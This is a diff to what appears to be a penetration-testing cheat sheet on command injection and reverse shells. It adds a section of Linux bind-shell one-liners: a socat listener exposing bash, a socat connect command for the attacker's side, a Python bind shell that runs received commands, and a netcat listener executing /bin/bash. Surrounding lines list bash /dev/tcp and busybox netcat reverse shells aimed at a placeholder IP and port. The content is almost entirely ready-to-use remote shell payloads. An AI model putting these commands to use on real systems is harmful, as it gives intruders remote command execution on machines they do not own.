@@ -31,6 +31,12 @@ pagetitle: Command Injection & Reverse Shells
 - A good resource here is: [Revshells](https://www.revshells.com/)
   - Can set the IP/port, and it will dynamically generate the payload
 
+**Linux Bind Shells**
+- Socat seems to be pretty solid: `socat TCP-LISTEN:{port},reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane`
+  - Then, on attacker machine: ``socat FILE:`tty`,raw,echo=0 TCP:target.com:{port}``
+- Python: `python3 -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",{port}));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'`
+- NC: `nc -nlvp {port} -e /bin/bash`
+
 **Linux Reverse shells**
 - `bash -i >& /dev/tcp/{IP}/{port} 0>&1`
 - `busybox nc {IP} {port} -e sh` or `busybox nc {IP} {port} -e /bin/sh`
